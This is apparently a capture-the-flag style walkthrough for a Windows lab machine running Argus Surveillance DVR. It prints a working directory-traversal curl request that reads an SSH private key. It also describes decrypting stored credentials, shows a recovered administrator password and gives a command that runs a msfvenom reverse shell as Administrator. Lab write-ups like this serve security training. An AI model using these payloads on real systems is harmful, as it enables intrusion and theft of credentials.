# 🏴 DVR4 (Windows)

## 🧠 Initial Foothold

- Accessed the web interface running on port 8080, identified as Argus Surveillance DVR.

- Found a list of usernames under the users section.

- Discovered a directory traversal vulnerability, and used it to retrieve the SSH private key for the viewer user with the following command:

  ```bash
  curl "http://192.168.216.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2Fviewer%2F.ssh%2Fid_rsa&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
  ```

- Used the retrieved private key to SSH into the machine as viewer.

---

## 🚀 Privilege Escalation

- Suspected weak password storage and searched for sensitive files.

- Found potential credentials in:  
  `C:\ProgramData\PY_Software\Argus Surveillance DVR\DVRParams.ini`

- Used the following tool to decrypt the stored password:  
  `s3l33/CVE-2022-25012`

- The decrypted credentials revealed the Administrator password.

- Created a reverse shell executable using msfvenom and uploaded it to the machine.

- Used Invoke-RunasCs to execute the shell as Administrator:

  ```powershell
  Invoke-RunasCs -Username Administrator -Password '14WatchD0g$' -Command "C:\Users\viewer\shell.exe"
  ```

- Successfully obtained a reverse shell as Administrator.

---

🧼 **Post-Exploitation Note:**  
Clean up any shells or payloads left behind.

> ⚠️ This walkthrough is for educational purposes only.
